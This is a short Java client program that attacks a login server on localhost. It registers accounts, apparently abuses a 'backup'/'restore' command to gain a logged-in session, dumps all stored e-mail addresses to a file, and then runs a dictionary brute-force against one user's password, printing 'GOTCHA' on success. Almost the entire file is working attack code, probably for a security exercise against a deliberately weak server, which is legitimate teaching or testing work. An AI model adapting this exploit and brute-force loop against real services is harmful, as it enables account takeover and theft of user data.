package login;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Client {
	public static void main(final String[] args) {
		try (Socket s = new Socket( "localhost", 80 );
				BufferedReader br = new BufferedReader( new InputStreamReader( s.getInputStream() ) );
				PrintWriter pw = new PrintWriter( new OutputStreamWriter( s.getOutputStream() ) )) {
			
			pw.println( "register a@a.a 12345" );
			pw.println( "register b@b.b asdf" );
			pw.flush();
			
			System.out.println( br.readLine() );
			System.out.println( br.readLine() );
			
			pw.println( "login a@a.a 12345" );
			pw.flush();
			
			System.out.println( br.readLine() );
			
			pw.println( "backup" );
			pw.flush();
			
			System.out.println( br.readLine() );
			
			pw.println( "register c@c.c 1q2w3e" );
			pw.println( "restore" );
			pw.println( "login c@c.c 1q2w3e" );
			pw.flush();
			
			System.out.println( br.readLine() );
			System.out.println( br.readLine() );
			System.out.println( br.readLine() );
			
			pw.println( "listMails" );
			pw.flush();
			
			saveResult( br );
			
			bruteforceUser( pw, br, "a@a.a" );
			
		} catch (final IOException e) {
			e.printStackTrace();
		}
	}
	
	private static void saveResult(final BufferedReader br) {
		try (PrintWriter pw = new PrintWriter( "e-mailst.txt" )) {
			String line = null;
			
			while ( ! ( line = br.readLine() ).equals( "--END--" ) ) {
				pw.println( line );
			}
		} catch (final IOException e) {
			e.printStackTrace();
		}
		System.out.println("E-mails saved");
	}
	
	private static void bruteforceUser(final PrintWriter pw, final BufferedReader br, final String userName) {
		try {
			for (final String pass : Files.readAllLines( Paths.get( "dictionary.txt" ), Charset.defaultCharset() )) {
				pw.println( "login " + userName + " " + pass );
				pw.flush();
				
				System.out.println("Trying " + userName + "/" + pass + "...");
				
				if ( Boolean.parseBoolean( br.readLine() ) ) {
					System.out.println( "GOTCHA " + userName + ": password = " + pass );
					break;
				}
			}
		} catch (final IOException e) {
			e.printStackTrace();
		}
	}
	
}
